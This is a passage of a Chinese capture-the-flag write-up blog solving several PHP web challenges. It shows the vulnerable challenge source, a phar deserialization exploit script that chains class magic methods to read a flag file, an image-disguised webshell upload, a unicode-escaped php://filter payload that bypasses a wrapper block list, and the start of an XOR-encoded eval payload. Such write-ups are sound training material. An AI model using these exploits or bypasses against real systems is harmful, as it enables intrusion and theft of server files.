class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        unlink(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-keyword">if</span>(upload_file_check()) &#123; <br>        upload_file_do(); <br>    &#125; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>); <br>    <span class="hljs-variable">$temp</span> = explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]); <br>    <span class="hljs-variable">$extension</span> = end(<span class="hljs-variable">$temp</span>); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123; <br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123; <br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>        &#125; <br>        <span class="hljs-keyword">else</span> &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            highlight_file(<span class="hljs-keyword">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = base64_encode(file_get_contents(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> Show(); <br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;_show(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>重点一定在于 class.php，没有明显的反序列化点就可以用构造恶意的phar归档文件，题目的注释中也做了相关提醒</p><p>最终目标是触发 file_get，一直file_get被get函数调用有 get &#x3D;&gt; file_get()</p><p>get函数被<code>__get</code> 方法调用    <code> __get</code> &#x3D;&gt;get() &#x3D;&gt; file_get()</p><p>怎么触发 <code>__get </code>方法？ 可以在 Show::__toString 这里用到，原始是如果我们给str一个实例化的Test类，Test在找source这个成员变量就会找不到自然就会触发<code>__get</code>方法，其实大概也有个规律了一般 $this-&gt;xxx-&gt;yyy 这种都是一眼<code>__get </code> 方法 <code>Show::__toString</code> &#x3D;&gt; <code> Test::__get</code> &#x3D;&gt; Test::get() &#x3D;&gt; Test::file_get()</p><p>在往上看  C1e4r 这个类还没有用过，它的析构函数有echo类成员变量操作，可以触发<code>__toString </code>方法，那么思路已经很清晰了<code> C1e4r::__destruct</code> </p><p>&#x3D;&gt; <code>Show::__toString</code> &#x3D;&gt; <code> Test::__get</code> &#x3D;&gt; Test::get() &#x3D;&gt; Test::file_get()</p><p>构建exp 然后记得把后缀改成.gif 或者其他可接受参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br><br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> C1e4r();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> Show();<br><br><span class="hljs-variable">$b</span>-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>] = <span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;  <span class="hljs-comment">//flag</span><br><span class="hljs-variable">$a</span>-&gt;str = <span class="hljs-variable">$c</span>;   <br><span class="hljs-variable">$c</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = <span class="hljs-variable">$b</span>;  <br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//生成phar文件</span><br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);  <span class="hljs-comment">//標誌位</span><br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$a</span>);   <span class="hljs-comment">//存入C1e4r类</span><br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);  <span class="hljs-comment">//生成签名</span><br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>然后根据 function.php 的这句话 <code>$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; </code></p><p>找我们的文件 <code>php -r &quot;echo(md5(&#39;phar.gif10.244.80.46&#39;));&quot;</code> </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271936865.png" alt="image-20220127193641797"></p><p>然后来到file.php 利用phar协议即可 解码即是flag</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271937910.png" alt="image-20220127193744830"></p><h2 id="WUST-CTF2020-CV-Maker"><a href="#WUST-CTF2020-CV-Maker" class="headerlink" title="[WUST-CTF2020]CV Maker"></a>[WUST-CTF2020]CV Maker</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271941999.png" alt="image-20220127194137581"></p><p>注册账号登录后发现可以上传头像 那就是 hta+图片马 注意hta也要加上GIF89a 来过 exif_imagetype</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271946399.png" alt="image-20220127194658281"></p><p>flag名字有点奇特</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271951013.png" alt="image-20220127195130951"></p><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>额，这题环境一直启动不了</p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  show_source(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-variable">$banword</span> = [<br>    <span class="hljs-comment">// no path traversal</span><br>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,<br>    <span class="hljs-comment">// no stream wrapper</span><br>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,<br>    <span class="hljs-comment">// no data exfiltration</span><br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>  ];<br>  <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$banword</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$str</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$body</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-variable">$json</span> = json_decode(<span class="hljs-variable">$body</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-keyword">if</span> (is_valid(<span class="hljs-variable">$body</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$page</span> = <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>  <span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-variable">$page</span>);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$content</span> || !is_valid(<span class="hljs-variable">$content</span>)) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// no data exfiltration!!!</span><br><span class="hljs-variable">$content</span> = preg_replace(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">echo</span> json_encode([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$content</span>]);<br></code></pre></td></tr></table></figure><p>这里is_valid只对原始数据做正则，同时在 \uxxx 在json中代码转义  字符  即  php &#x3D; <code>\u0070\u0068\u0070</code></p><p>因为这里对读取的内容也做了匹配所以编码输出</p><p><code>&#123;&quot;page&quot;:&quot;php://filter/convert.base64-encode/resource=/flag&quot;&#125;</code> &#x3D;&gt;</p><p><code>&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006C\u0061\u0067&quot;&#125;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201272048334.png" alt="image-20220127204858214"></p><p>右边内容bs64decode即可</p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$userdir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = substr(<span class="hljs-variable">$name</span>, strrpos(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(mb_strpos(file_get_contents(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==<span class="hljs-literal">False</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!exif_imagetype(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @move_uploaded_file(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        print_r(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = count_chars(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看看phpinfo,直接用佬的payload </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?_=$&#123;<span class="hljs-meta">%</span>ff<span class="hljs-meta">%</span>ff<span class="hljs-meta">%</span>ff<span class="hljs-meta">%</span>ff^<span class="hljs-meta">%</span>a<span class="hljs-number">0</span><span class="hljs-meta">%</span>b<span class="hljs-number">8</span><span class="hljs-meta">%</span>ba<span class="hljs-meta">%</span>ab&#125;&#123;<span 